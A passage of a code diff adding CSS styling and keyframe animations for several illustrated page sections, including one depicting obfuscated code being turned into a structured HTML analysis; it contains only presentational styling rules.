+  gap: 80px 60px;
+  padding: 30px 40px;
+  box-sizing: border-box;
+}
+
+.s5_card {
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  justify-content: center;
+  background: white;
+  border-radius: 12px;
+  box-shadow: 0 2px 8px rgba(101, 163, 13, 0.15);
+  opacity: 0;
+  transform: scale(0.7);
+  z-index: 1;
+}
+
+.s5_card_text {
+  font-size: 11px;
+  font-weight: 700;
+  color: #333;
+  letter-spacing: 0.5px;
+}
+
+.s5_stage.visible .s5_card:nth-child(1) {
+  animation: s5_card_pop 0.5s cubic-bezier(0.34, 1.56, 0.64, 1) 2.8s forwards;
+}
+.s5_stage.visible .s5_card:nth-child(2) {
+  animation: s5_card_pop 0.5s cubic-bezier(0.34, 1.56, 0.64, 1) 3.1s forwards;
+}
+.s5_stage.visible .s5_card:nth-child(3) {
+  animation: s5_card_pop 0.5s cubic-bezier(0.34, 1.56, 0.64, 1) 3.4s forwards;
+}
+.s5_stage.visible .s5_card:nth-child(4) {
+  animation: s5_card_pop 0.5s cubic-bezier(0.34, 1.56, 0.64, 1) 3.7s forwards;
+}
+
+/* File icon */
+.s5_icon_file {
+  width: 22px;
+  height: 28px;
+  border: 2.5px solid #65A30D;
+  border-radius: 2px 6px 2px 2px;
+  position: relative;
+  margin-bottom: 6px;
+}
+.s5_icon_file::after {
+  content: "";
+  position: absolute;
+  top: -2.5px;
+  right: -2.5px;
+  width: 10px;
+  height: 10px;
+  border-bottom: 2.5px solid #65A30D;
+  border-left: 2.5px solid #65A30D;
+  border-radius: 0 0 0 3px;
+  background: white;
+}
+
+/* No-build icon */
+.s5_icon_nobuild {
+  width: 26px;
+  height: 28px;
+  position: relative;
+  margin-bottom: 6px;
+}
+.s5_icon_gear {
+  width: 24px;
+  height: 24px;
+  border: 2.5px solid #7E22CE;
+  border-radius: 50%;
+  position: relative;
+  opacity: 0.5;
+}
+.s5_icon_gear::before {
+  content: "";
+  position: absolute;
+  top: 50%;
+  left: 50%;
+  width: 8px;
+  height: 8px;
+  border: 2px solid #7E22CE;
+  border-radius: 50%;
+  transform: translate(-50%, -50%);
+}
+.s5_icon_slash {
+  position: absolute;
+  top: -2px;
+  left: 10px;
+  width: 3px;
+  height: 32px;
+  background: #7E22CE;
+  border-radius: 2px;
+  transform: rotate(45deg);
+  transform-origin: center;
+}
+
+/* Cloud icon */
+.s5_icon_cloud {
+  width: 30px;
+  height: 20px;
+  background: #7E22CE;
+  border-radius: 10px;
+  position: relative;
+  margin-bottom: 10px;
+  margin-top: 4px;
+}
+.s5_icon_cloud::before {
+  content: "";
+  position: absolute;
+  top: -8px;
+  left: 6px;
+  width: 14px;
+  height: 14px;
+  background: #7E22CE;
+  border-radius: 50%;
+}
+.s5_icon_cloud::after {
+  content: "";
+  position: absolute;
+  top: -12px;
+  left: 14px;
+  width: 10px;
+  height: 10px;
+  background: #7E22CE;
+  border-radius: 50%;
+}
+
+/* Brain icon */
+.s5_icon_brain {
+  width: 26px;
+  height: 26px;
+  border: 2.5px solid #65A30D;
+  border-radius: 50% 50% 50% 50% / 60% 60% 40% 40%;
+  position: relative;
+  margin-bottom: 6px;
+}
+.s5_icon_brain::before {
+  content: "";
+  position: absolute;
+  top: 4px;
+  left: 50%;
+  width: 2px;
+  height: 14px;
+  background: #65A30D;
+  transform: translateX(-50%);
+}
+.s5_icon_brain::after {
+  content: "";
+  position: absolute;
+  top: 9px;
+  left: 4px;
+  width: 14px;
+  height: 2px;
+  background: #65A30D;
+  border-radius: 1px;
+}
+
+/* Pulse ring */
+.s5_pulse {
+  position: absolute;
+  top: 50%;
+  left: 50%;
+  width: 80px;
+  height: 80px;
+  border-radius: 50%;
+  border: 2px solid #65A30D;
+  transform: translate(-50%, -50%);
+  opacity: 0;
+}
+
+.s5_stage.visible .s5_pulse {
+  animation: s5_pulse_ring 1.2s ease-out 2.6s forwards;
+}
+
+@keyframes s5_scroll_up {
+  0% { transform: translateY(0); }
+  100% { transform: translateY(-780px); }
+}
+
+@keyframes s5_fade_in {
+  0% { opacity: 0; transform: translateY(6px); }
+  100% { opacity: 1; transform: translateY(0); }
+}
+
+@keyframes s5_card_pop {
+  0% { opacity: 0; transform: scale(0.7); }
+  60% { opacity: 1; transform: scale(1.05); }
+  100% { opacity: 1; transform: scale(1); }
+}
+
+@keyframes s5_pulse_ring {
+  0% { opacity: 0.6; width: 80px; height: 80px; }
+  100% { opacity: 0; width: 180px; height: 180px; }
+}
+
+/* === S6 Animation === */
+
+/* S6 — Obfuscated code through GPT-5.5 to structured HTML */
+.s6_stage {
+  width: 340px;
+  margin: 0 auto;
+  padding: 24px 16px;
+  background: #0F172A;
+  border-radius: 12px;
+  font-family: -apple-system, "Helvetica Neue", Arial, sans-serif;
+  color: #E2E8F0;
+  overflow: hidden;
+}
+
+/* --- Left: obfuscated code block --- */
+.s6_messy {
+  background: #1E293B;
+  border-radius: 6px;
+  padding: 10px 12px;
+  font-family: "SF Mono", "Consolas", monospace;
+  font-size: 9px;
+  line-height: 1.5;
+  color: #DC2626;
+  white-space: pre-wrap;
+  word-break: break-all;
+  opacity: 0;
+  min-height: 54px;
+  border: 1px solid #DC262633;
+}
+.s6_stage.visible .s6_messy {
+  animation: s6_fadeIn 0.5s 0.4s both;
+}
+.s6_messy_label {
+  font-family: -apple-system, "Helvetica Neue", Arial, sans-serif;
+  font-size: 10px;
+  color: #94A3B8;
+  margin-bottom: 6px;
+  opacity: 0;
+}
+.s6_stage.visible .s6_messy_label {
+  animation: s6_fadeIn 0.4s 0.4s both;
+}
+
+/* --- Arrow + GPT processor --- */
+.s6_pipeline {
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  gap: 8px;
+  margin: 14px 0;
+  opacity: 0;
+}
+.s6_stage.visible .s6_pipeline {
+  animation: s6_fadeIn 0.5s 1.2s both;
+}
+.s6_arrow {
+  font-size: 16px;
+  color: #94A3B8;
+}
+.s6_processor {
+  display: inline-flex;
+  align-items: center;
+  gap: 6px;
+  background: #7E22CE22;
+  border: 1.5px solid #7E22CE;
+  border-radius: 8px;
+  padding: 6px 14px;
+  font-size: 13px;
+  font-weight: 600;
+  color: #7E22CE;
+}
+.s6_stage.visible .s6_processor {
+  animation: s6_pulse 1.5s 1.6s both;
+}
+
+/* --- Connector beam from processor to output --- */
+.s6_beam {
+  width: 2px;
+  height: 0;
+  background: linear-gradient(180deg, #7E22CE, #65A30D);
+  margin: 0 auto;
+  border-radius: 1px;
+}
+.s6_stage.visible .s6_beam {
+  animation: s6_beamGrow 0.4s 2.2s both;
+}
+
+/* --- Right: clean HTML output --- */
+.s6_output {
+  background: #1E293B;
+  border-radius: 8px;
+  border: 1.5px solid #65A30D44;
+  padding: 12px;
+  margin-top: 12px;
+  opacity: 0;
+}
+.s6_stage.visible .s6_output {
+  animation: s6_fadeIn 0.5s 2.6s both;
+}
+.s6_output_label {
+  font-size: 10px;
+  color: #94A3B8;
+  margin-bottom: 8px;
+  opacity: 0;
+}
+.s6_stage.visible .s6_output_label {
+  animation: s6_fadeIn 0.4s 2.6s both;
+}
+
+/* Warning banner inside output */
+.s6_warn {
+  background: #DC262622;
+  border: 1px solid #DC262655;
+  border-radius: 4px;
+  padding: 5px 8px;
+  font-size: 10px;
+  font-weight: 600;
+  color: #DC2626;
+  margin-bottom: 8px;
+  display: flex;
+  align-items: center;
+  gap: 5px;
+  opacity: 0;
+}
+.s6_stage.visible .s6_warn {
+  animation: s6_slideIn 0.4s 3.0s both;
+}
+.s6_warn_icon {
+  width: 14px;
+  height: 14px;
+  border-radius: 50%;
+  background: #DC2626;
+  color: #fff;
+  font-size: 9px;
+  font-weight: 700;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  flex-shrink: 0;
+}
+
+/* Summary card inside output */
+.s6_summary {
+  background: #65A30D15;
+  border: 1px solid #65A30D33;
+  border-radius: 4px;
+  padding: 6px 8px;
+  margin-bottom: 8px;
+  opacity: 0;
+}
+.s6_stage.visible .s6_summary {
+  animation: s6_slideIn 0.4s 3.4s both;
+}
+.s6_summary_title {
+  font-size: 10px;
+  font-weight: 600;
+  color: #65A30D;
+  margin-bottom: 3px;
+}
+.s6_summary_text {
+  font-size: 9px;
+  color: #94A3B8;
+  line-height: 1.4;
+}
+
+/* Code analysis block inside output */
+.s6_code_out {
+  background: #0F172A;
+  border-radius: 4px;
+  padding: 6px 8px;
+  font-family: "SF Mono", "Consolas", monospace;
+  font-size: 8.5px;
+  color: #65A30D;
+  line-height: 1.5;
+  margin-bottom: 8px;
+  border: 1px solid #334155;
+  opacity: 0;
+}
+.s6_stage.visible .s6_code_out {
+  animation: s6_slideIn 0.4s 3.8s both;
+}
+.s6_code_out_label {
+  color: #94A3B8;
+  font-family: -apple-system, "Helvetica Neue", Arial, sans-serif;
+  font-size: 9px;
+  margin-bottom: 4px;
+}
+
+/* Function breakdowns */
+.s6_funcs {
+  display: flex;
+  gap: 6px;
+  opacity: 0;
+}
+.s6_stage.visible .s6_funcs {
+  animation: s6_slideIn 0.4s 4.2s both;
+}
+.s6_func {
+  flex: 1;
+  background: #7E22CE15;
+  border: 1px solid #7E22CE33;
+  border-radius: 4px;
+  padding: 5px 6px;
+  text-align: center;
+}
+.s6_func_name {
+  font-family: "SF Mono", "Consolas", monospace;
+  font-size: 9px;
+  color: #7E22CE;
+  font-weight: 600;
+  margin-bottom: 2px;
+}
+.s6_func_desc {
+  font-size: 8px;
+  color: #94A3B8;
+}
+
+/* --- Keyframes --- */
+@keyframes s6_fadeIn {
+  from { opacity: 0; transform: translateY(8px); }
+  to { opacity: 1; transform: translateY(0); }
+}
+@keyframes s6_slideIn {
+  from { opacity: 0; transform: translateX(-10px); }
+  to { opacity: 1; transform: translateX(0); }
+}
+@keyframes s6_pulse {
+  0% { opacity: 0; box-shadow: 0 0 0 0 #7E22CE44; }
+  30% { opacity: 1; }
+  50% { box-shadow: 0 0 12px 4px #7E22CE44; }
+  100% { opacity: 1; box-shadow: 0 0 0 0 #7E22CE00; }
+}
+@keyframes s6_beamGrow {
+  from { height: 0; }
+  to { height: 16px; }
+}
+
+/* === A1 Animation === */
+
+.a1_stage {
+  width: 340px;
+  min-height: 480px;
+  background: #F7FEE7;
+  border-radius: 18px;
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  padding: 32px 24px 28px;
+  font-family: "Helvetica Neue", Arial, sans-serif;
+  position: relative;
+  overflow: hidden;
+  box-sizing: border-box;
+}
+
+.a1_title {
+  font-size: 15px;
+  font-weight: 700;
+  color: #65A30D;
+  margin-bottom: 24px;
+  letter-spacing: 0.5px;
+  opacity: 0;
+}
+
+.a1_list {
+  position: relative;
+  display: flex;
+  flex-direction: column;
+  gap: 16px;
+  width: 100%;
+  padding-left: 36px;
+  box-sizing: border-box;
+}
+
+.a1_line {
+  position: absolute;
+  left: 15px;
+  top: 12px;
+  bottom: 12px;
+  width: 2px;
+  background: #65A30D;
+  transform-origin: top center;
+  transform: scaleY(0);
+}
+
+.a1_item {
+  display: flex;
+  align-items: center;
+  gap: 12px;
+  opacity: 0;
+  transform: translateX(-12px);
+}
+
+.a1_check {
+  width: 24px;
+  height: 24px;
+  min-width: 24px;
+  border-radius: 50%;
+  border: 2px solid #65A30D;
+  position: relative;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  margin-left: -36px;
+  background: #F7FEE7;
+  z-index: 1;
+}
+
+.a1_check::after {
+  content: "";
+  width: 10px;
+  height: 6px;
+  border-left: 2.5px solid #65A30D;
+  border-bottom: 2.5px solid #65A30D;
+  transform: rotate(-45deg) scale(0);
+  display: block;
+  margin-top: -2px;
+}
+
+.a1_icon {
+  font-size: 18px;
+  min-width: 24px;
+  text-align: center;
+}
+
+.a1_label {
+  display: flex;
+  flex-direction: column;
+  gap: 2px;
+}
+
+.a1_name {
+  font-size: 13px;
+  font-weight: 700;
+  color: #333;
+}
+
+.a1_desc {
+  font-size: 11px;
+  color: #65A30D;
+  line-height: 1.3;
+}
+
+.a1_badge {
+  margin-top: 24px;
+  background: linear-gradient(135deg, #65A30D, #7E22CE);
+  color: #fff;
+  font-size: 14px;
+  font-weight: 700;
+  padding: 10px 28px;
+  border-radius: 24px;
+  letter-spacing: 1px;
+  opacity: 0;
+  transform: scale(0.6);
+}
+
+/* Animations */
+@keyframes a1_fadeIn {
+  to { opacity: 1; }
+}
+
+@keyframes a1_itemIn {
+  to { opacity: 1; transform: translateX(0); }
+}
+
+@keyframes a1_checkPop {
+  to { transform: rotate(-45deg) scale(1); }
+}
+
+@keyframes a1_lineGrow {
+  to { transform: scaleY(1); }
+}
+
+@keyframes a1_badgeIn {
+  to { opacity: 1; transform: scale(1); }
+}
+
+.a1_stage.visible .a1_title {
+  animation: a1_fadeIn 0.4s ease 0.4s forwards;
+}
+
+.a1_stage.visible .a1_line {
+  animation: a1_lineGrow 1.6s ease 0.6s forwards;
+}
+
+.a1_stage.visible .a1_item:nth-child(1) {
+  animation: a1_itemIn 0.4s ease 0.8s forwards;
+}
+.a1_stage.visible .a1_item:nth-child(1) .a1_check::after {
+  animation: a1_checkPop 0.3s ease 1.1s forwards;
+}
+
+.a1_stage.visible .a1_item:nth-child(2) {
+  animation: a1_itemIn 0.4s ease 1.2s forwards;
+}
+.a1_stage.visible .a1_item:nth-child(2) .a1_check::after {
+  animation: a1_checkPop 0.3s ease 1.5s forwards;
+}
+
+.a1_stage.visible .a1_item:nth-child(3) {
+  animation: a1_itemIn 0.4s ease 1.6s forwards;
+}
+.a1_stage.visible .a1_item:nth-child(3) .a1_check::after {
+  animation: a1_checkPop 0.3s ease 1.9s forwards;
+}
+
+.a1_stage.visible .a1_item:nth-child(4) {
+  animation: a1_itemIn 0.4s ease 2.0s forwards;
+}
+.a1_stage.visible .a1_item:nth-child(4) .a1_check::after {
+  animation: a1_checkPop 0.3s ease 2.3s forwards;
+}
+
+.a1_stage.visible .a1_badge {
+  animation: a1_badgeIn 0.5s cubic-bezier(0.34, 1.56, 0.64, 1) 2.6s forwards;
+}
+
+/* === A2 Animation === */
+
+.a2_stage {
+  width: 340px;
+  height: 260px;
+  background: #FAF5FF;
+  border-radius: 12px;
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  justify-content: center;
+  font-family: system-ui, -apple-system, sans-serif;
+  position: relative;
+  overflow: hidden;
+  gap: 10px;
+}
+.a2_columns {
+  display: flex;
+  gap: 16px;
+  justify-content: center;
+}
+.a2_col {
+  width: 140px;
+  border-radius: 10px;
+  padding: 12px 10px;
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  gap: 8px;
+  opacity: 0;
+}
+.a2_col_url {
+  background: rgba(101,163,13,0.12);
+  border: 2px solid #65A30D;
+}
+.a2_col_local {
+  background: rgba(126,34,206,0.12);
+  border: 2px solid #7E22CE;
+}
+.a2_col_title {
+  font-size: 15px;
+  font-weight: 700;
+  letter-spacing: 1px;
+}
+.a2_col_url .a2_col_title {
+  color: #65A30D;
+}
+.a2_col_local .a2_col_title {
+  color: #7E22CE;
+}
+.a2_bar {
+  width: 110px;
+  height: 22px;
+  border-radius: 11px;
+  background: #fff;
+  border: 1.5px solid #65A30D;
+  display: flex;
+  align-items: center;
+  padding: 0 8px;
+  gap: 4px;
+}
+.a2_bar_dot {
+  width: 5px;
+  height: 5px;
+  border-radius: 50%;
+  background: #65A30D;
+  flex-shrink: 0;
+}
+.a2_bar_line {
+  flex: 1;
+  height: 2px;
+  background: #65A30D;
+  border-radius: 1px;
+  opacity: 0.5;
+}
+.a2_tag {
+  font-size: 11px;
+  padding: 3px 10px;
+  border-radius: 6px;
+  font-weight: 600;
+}
+.a2_col_url .a2_tag {
+  background: #65A30D;
+  color: #fff;
+}
+.a2_col_local .a2_tag {
+  background: #7E22CE;
+  color: #fff;
+}
+.a2_db_icon {
+  width: 36px;
+  height: 30px;
+  position: relative;
+}
+.a2_db_body {
+  width: 36px;
+  height: 22px;
+  background: #7E22CE;
+  border-radius: 4px;
+  position: absolute;
+  bottom: 0;
+  opacity: 0.25;
+}
+.a2_db_top {
+  width: 36px;
+  height: 12px;
+  background: #7E22CE;
+  border-radius: 50%;
+  position: absolute;
+  top: 4px;
+}
+.a2_rect_tag {
+  font-size: 10px;
+  padding: 3px 8px;
+  border-radius: 4px;
+  font-weight: 600;
+  white-space: nowrap;
+}
+.a2_col_local .a2_rect_tag {
+  background: rgba(126,34,206,0.18);
+  color: #7E22CE;
+}
+.a2_arrows {
+  display: flex;
+  gap: 6px;
+  margin-top: 2px;
+}
+.a2_arrow_tag {
+  font-size: 10px;
+  padding: 2px 8px;
+  border-radius: 4px;
+  background: rgba(101,163,13,0.15);
+  color: #65A30D;
+  font-weight: 600;
+  display: flex;
+  align-items: center;
+  gap: 3px;
+}
+.a2_arrow_tag::before {
+  content: "";
+  display: inline-block;
+  width: 0;
+  height: 0;
+  border-left: 4px solid #65A30D;
+  border-top: 3px solid transparent;
+  border-bottom: 3px solid transparent;
+}
+.a2_badge {
+  display: flex;
+  align-items: center;
+  gap: 6px;
+  background: linear-gradient(90deg, #65A30D, #7E22CE);
+  color: #fff;
+  font-size: 13px;
+  font-weight: 700;
+  padding: 6px 24px;
+  border-radius: 20px;
+  opacity: 0;
+  letter-spacing: 1px;
+}
+.a2_badge_dot {
+  width: 6px;
+  height: 6px;
+  background: #fff;
+  border-radius: 50%;
+}
+/* Animations */
+@keyframes a2_slideInLeft {
+  0% { opacity: 0; transform: translateX(-30px); }
+  100% { opacity: 1; transform: translateX(0); }
+}
+@keyframes a2_slideInRight {
+  0% { opacity: 0; transform: translateX(30px); }
+  100% { opacity: 1; transform: translateX(0); }
+}
+@keyframes a2_badgePop {
+  0% { opacity: 0; transform: scale(0.5); }
+  60% { opacity: 1; transform: scale(1.1); }
+  100% { opacity: 1; transform: scale(1); }
+}
+@keyframes a2_pulse {
+  0%, 100% { opacity: 1; }
+  50% { opacity: 0.6; }
+}
+.a2_stage.visible .a2_col_url {
+  animation: a2_slideInLeft 0.5s ease-out 0.4s both;
+}
+.a2_stage.visible .a2_col_local {
+  animation: a2_slideInRight 0.5s ease-out 0.9s both;
+}
+.a2_stage.visible .a2_badge {
+  animation: a2_badgePop 0.5s ease-out 1.4s both;
+}
+.a2_stage.visible .a2_badge_dot {
+  animation: a2_pulse 1.5s ease-in-out 1.9s infinite;
+}
+
+/* === A3 Animation === */
+
+.a3_stage {
+  width: 340px;
+  height: 400px;
+  background: #F7FEE7;
+  border-radius: 12px;
+  position: relative;
+  overflow: hidden;
+  font-family: system-ui, -apple-system, sans-serif;
+}
+
+/* Title */
+.a3_title {
+  position: absolute;
+  top: 14px;
+  width: 100%;
+  text-align: center;
+  font-size: 14px;
+  font-weight: 700;
+  color: #65A30D;
+  opacity: 0;
+}
+.a3_stage.visible .a3_title {
+  animation: a3_fadeIn 0.5s ease-out 0.4s forwards;
+}
+.a3_subtitle {
+  position: absolute;
+  top: 38px;
+  width: 100%;
+  text-align: center;
+  font-size: 11px;
+  color: #7E22CE;
+  opacity: 0;
+}
+.a3_stage.visible .a3_subtitle {
+  animation: a3_fadeIn 0.5s ease-out 0.6s forwards;
+}
+
+/* Section headers */
+.a3_head_api {
+  position: absolute;
+  top: 68px;
+  left: 12px;
+  font-size: 10px;
+  font-weight: 700;
+  color: #7E22CE;
+  opacity: 0;
+}
+.a3_stage.visible .a3_head_api {
+  animation: a3_fadeIn 0.4s ease-out 0.8s forwards;
+}
+.a3_head_file {
+  position: absolute;
+  top: 68px;
+  right: 12px;
+  font-size: 10px;
+  font-weight: 700;
+  color: #65A30D;
+  opacity: 0;
+}
+.a3_stage.visible .a3_head_file {
+  animation: a3_fadeIn 0.4s ease-out 0.8s forwards;
+}
+
+/* Browser window center */
+.a3_browser {
+  position: absolute;
+  top: 120px;
+  left: 95px;
+  width: 150px;
+  height: 100px;
+  border: 2px solid #65A30D;
+  border-radius: 8px;
+  background: #fff;
+  opacity: 0;
+  transform: scale(0.7);
+}
+.a3_stage.visible .a3_browser {
+  animation: a3_browserIn 0.5s ease-out 0.4s forwards;
+}
+.a3_browser_bar {
+  height: 16px;
+  background: #65A30D;
+  border-radius: 6px 6px 0 0;
+  display: flex;
+  align-items: center;
+  padding-left: 5px;
+  gap: 3px;
+}
+.a3_browser_dot {
+  width: 5px;
+  height: 5px;
+  border-radius: 50%;
+  background: #F7FEE7;
+}
+.a3_browser_label {
+  position: absolute;
+  bottom: 8px;
+  width: 100%;
+  text-align: center;
+  font-size: 11px;
+  color: #65A30D;
+  font-weight: 600;
+}
+
+/* Processing pulse */
+.a3_pulse {
+  position: absolute;
+  top: 40px;
+  left: 50%;
+  transform: translateX(-50%);
+  width: 30px;
+  height: 30px;
+  border-radius: 50%;
+  background: #7E22CE;
+  opacity: 0;
+}
+.a3_stage.visible .a3_pulse {
+  animation: a3_pulseGlow 1s ease-in-out 2.4s infinite;
+}
+
+/* API tags left column */
+.a3_api_col {
+  position: absolute;
+  top: 86px;
+  left: 8px;
+  display: flex;
+  flex-direction: column;
+  gap: 8px;
+}
+.a3_api_tag {
+  background: #7E22CE;
+  color: #fff;
+  font-size: 10px;
+  font-weight: 600;
+  padding: 3px 7px;
+  border-radius: 4px;
+  white-space: nowrap;
+  opacity: 0;
+  transform: translateX(-20px);
+}
+.a3_stage.visible .a3_at1 { animation: a3_slideL 0.4s ease-out 1.0s forwards; }
+.a3_stage.visible .a3_at2 { animation: a3_slideL 0.4s ease-out 1.3s forwards; }
+.a3_stage.visible .a3_at3 { animation: a3_slideL 0.4s ease-out 1.6s forwards; }
+.a3_stage.visible .a3_at4 { animation: a3_slideL 0.4s ease-out 1.9s forwards; }
+
+/* API arrows */
+.a3_arw_box_l {
+  position: absolute;
+  left: 60px;
+  display: flex;
+  flex-direction: column;
+  gap: 0;
+}
+.a3_arw_l {
+  position: absolute;
+  left: 62px;
+  width: 30px;
+  height: 2px;
+  background: #7E22CE;
+  opacity: 0;
+  transform-origin: left center;
+  transform: scaleX(0);
+}
+.a3_arw_l::after {
+  content: "";
+  position: absolute;
+  right: -5px;
+  top: -4px;
+  border: 5px solid transparent;
+  border-left: 6px solid #7E22CE;
+}
+.a3_al1 { top: 112px; }
+.a3_al2 { top: 131px; }
+.a3_al3 { top: 150px; }
+.a3_al4 { top: 169px; }
+.a3_stage.visible .a3_al1 { animation: a3_drawH 0.3s ease-out 1.2s forwards; }
+.a3_stage.visible .a3_al2 { animation: a3_drawH 0.3s ease-out 1.5s forwards; }
+.a3_stage.visible .a3_al3 { animation: a3_drawH 0.3s ease-out 1.8s forwards; }
+.a3_stage.visible .a3_al4 { animation: a3_drawH 0.3s ease-out 2.1s forwards; }
+
+/* File tags right column */
+.a3_file_col {
+  position: absolute;
+  top: 96px;
+  right: 8px;
+  display: flex;
+  flex-direction: column;
+  gap: 8px;
+  align-items: flex-end;
+}
+.a3_file_tag {
+  background: #65A30D;
+  color: #fff;
+  font-size: 10px;
+  font-weight: 600;
+  padding: 3px 7px;
+  border-radius: 4px;
+  white-space: nowrap;
+  opacity: 0;
+  transform: translateX(20px);
+}
+.a3_stage.visible .a3_ft1 { animation: a3_slideR 0.4s ease-out 1.2s forwards; }
+.a3_stage.visible .a3_ft2 { animation: a3_slideR 0.4s ease-out 1.6s forwards; }
+.a3_stage.visible .a3_ft3 { animation: a3_slideR 0.4s ease-out 2.0s forwards; }
+
+/* File arrows */
+.a3_arw_r {
+  position: absolute;
+  right: 68px;
+  width: 25px;
+  height: 2px;
+  background: #65A30D;
+  opacity: 0;
+  transform-origin: right center;
+  transform: scaleX(0);
+}
+.a3_arw_r::after {
+  content: "";
+  position: absolute;
+  left: -5px;
+  top: -4px;
+  border: 5px solid transparent;
+  border-right: 6px solid #65A30D;
+}
+.a3_ar1 { top: 122px; }
+.a3_ar2 { top: 141px; }
+.a3_ar3 { top: 160px; }
+.a3_stage.visible .a3_ar1 { animation: a3_drawH 0.3s ease-out 1.4s forwards; }
+.a3_stage.visible .a3_ar2 { animation: a3_drawH 0.3s ease-out 1.8s forwards; }
+.a3_stage.visible .a3_ar3 { animation: a3_drawH 0.3s ease-out 2.2s forwards; }
+
+/* Down arrow */
+.a3_arw_down {
+  position: absolute;
+  top: 222px;
+  left: 169px;
+  width: 2px;
+  height: 35px;
+  background: #65A30D;
+  opacity: 0;
+  transform-origin: top center;
+  transform: scaleY(0);
+}
+.a3_arw_down::after {
+  content: "";
+  position: absolute;
+  bottom: -5px;
+  left: -4px;
+  border: 5px solid transparent;
+  border-top: 6px solid #65A30D;
+}
+.a3_stage.visible .a3_arw_down {
+  animation: a3_drawV 0.3s ease-out 2.7s forwards;
+}
+
+/* Result cards */
+.a3_results {
+  position: absolute;
+  bottom: 65px;
+  left: 50%;
+  transform: translateX(-50%);
+  display: flex;
+  gap: 10px;
+}
+.a3_result_card {
+  background: #fff;
+  border: 2px solid #65A30D;
+  border-radius: 6px;
+  padding: 6px 10px;
+  font-size: 10px;
+  font-weight: 600;
+  color: #65A30D;
+  opacity: 0;
+  transform: translateY(-10px);
+}
+.a3_stage.visible .a3_rc1 { animation: a3_resultIn 0.4s ease-out 3.0s forwards; }
+.a3_stage.visible .a3_rc2 { animation: a3_resultIn 0.4s ease-out 3.3s forwards; }
+.a3_stage.visible .a3_rc3 { animation: a3_resultIn 0.4s ease-out 3.6s forwards; }
+
+/* Badge */
+.a3_badge {
+  position: absolute;
+  bottom: 30px;
+  left: 50%;
+  transform: translateX(-50%);
+  font-size: 10px;
+  color: #7E22CE;
+  font-weight: 700;
+  opacity: 0;
+  white-space: nowrap;
+  padding: 3px 10px;
+  border: 1.5px dashed #7E22CE;
+  border-radius: 4px;
+}
+.a3_stage.visible .a3_badge {
+  animation: a3_fadeIn 0.4s ease-out 3.8s forwards;
+}
+
+/* Keyframes */
+@keyframes a3_browserIn {
+  from { opacity: 0; transform: scale(0.7); }
+  to { opacity: 1; transform: scale(1); }
+}
+@keyframes a3_fadeIn {
+  from { opacity: 0; }
+  to { opacity: 1; }
+}
+@keyframes a3_slideL {
+  from { opacity: 0; transform: translateX(-20px); }
+  to { opacity: 1; transform: translateX(0); }
+}
+@keyframes a3_slideR {
+  from { opacity: 0; transform: translateX(20px); }
+  to { opacity: 1; transform: translateX(0); }
+}
+@keyframes a3_drawH {
+  from { opacity: 1; transform: scaleX(0); }
+  to { opacity: 1; transform: scaleX(1); }
+}
+@keyframes a3_drawV {
+  from { opacity: 1; transform: scaleY(0); }
+  to { opacity: 1; transform: scaleY(1); }
+}
+@keyframes a3_pulseGlow {
+  0% { opacity: 0; transform: translateX(-50%) scale(0.5); }
+  50% { opacity: 0.7; transform: translateX(-50%) scale(1.2); }
+  100% { opacity: 0; transform: translateX(-50%) scale(0.5); }
+}
+@keyframes a3_resultIn {
+  from { opacity: 0; transform: translateY(-10px); }
+  to { opacity: 1; transform: translateY(0); }
+}
+
+/* === A4 Animation === */
+
+.a4_stage {
+  width: 340px;
+  height: 360px;
+  background: #FAF5FF;
+  border-radius: 12px;
+  position: relative;
+  overflow: hidden;
+  font-family: system-ui, -apple-system, sans-serif;
+}
+
+.a4_layers {
+  position: absolute;
+  bottom: 30px;
+  left: 50%;
+  transform: translateX(-50%);
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  gap: 6px;
+}
+
+.a4_layer {
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  border-radius: 8px;
+  font-size: 13px;
+  font-weight: 600;
+  opacity: 0;
+  transform: translateY(30px);
+  color: #fff;
+}
+
+.a4_layer_browser {
+  width: 300px;
+  height: 50px;
+  background: #7E22CE;
+}
+
+.a4_layer_wasm {
+  width: 280px;
+  height: 44px;
+  background: #65A30D;
+}
+
+.a4_apps {
+  display: flex;
+  gap: 6px;
+  justify-content: center;
+}
+
+.a4_app {
+  width: 88px;
+  height: 42px;
+  border-radius: 6px;
+  background: #7E22CE;
+  color: #fff;
+  font-size: 11px;
+  font-weight: 600;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  opacity: 0;
+  transform: scale(0.7);
+}
+
+.a4_hosting {
+  position: absolute;
+  top: 18px;
+  right: 16px;
+  display: flex;
+  align-items: center;
+  gap: 4px;
+  opacity: 0;
+}
+
+.a4_hosting_label {
+  background: #65A30D;
+  color: #fff;
+  font-size: 11px;
+  font-weight: 600;
+  padding: 4px 10px;
+  border-radius: 14px;
+  white-space: nowrap;
+}
+
+.a4_hosting_arrow {
+  width: 2px;
+  height: 0;
+  background: #65A30D;
+  position: absolute;
+  top: 28px;
+  right: 52px;
+  transform-origin: top center;
+}
+
+.a4_hosting_arrow::after {
+  content: "";
+  position: absolute;
+  bottom: -6px;
+  left: -4px;
+  width: 0;
+  height: 0;
+  border-left: 5px solid transparent;
+  border-right: 5px solid transparent;
+  border-top: 6px solid #65A30D;
+}
+
+.a4_title {
+  position: absolute;
+  top: 14px;
+  left: 16px;
+  font-size: 13px;
+  font-weight: 700;
+  color: #7E22CE;
+  opacity: 0;
+}
+
+.a4_free_tag {
+  position: absolute;
+  top: 46px;
+  right: 20px;
+  font-size: 10px;
+  color: #65A30D;
+  font-weight: 600;
+  opacity: 0;
+}
+
+/* Animations */
+.a4_stage.visible .a4_title {
+  animation: a4_fadeIn 0.4s 0.4s ease both;
+}
+
+.a4_stage.visible .a4_layer_browser {
+  animation: a4_slideUp 0.5s 0.8s ease both;
+}
+
+.a4_stage.visible .a4_layer_wasm {
+  animation: a4_slideUp 0.5s 1.2s ease both;
+}
+
+.a4_stage.visible .a4_app:nth-child(1) {
+  animation: a4_popIn 0.4s 1.7s ease both;
+}
+
+.a4_stage.visible .a4_app:nth-child(2) {
+  animation: a4_popIn 0.4s 1.9s ease both;
+}
+
+.a4_stage.visible .a4_app:nth-child(3) {
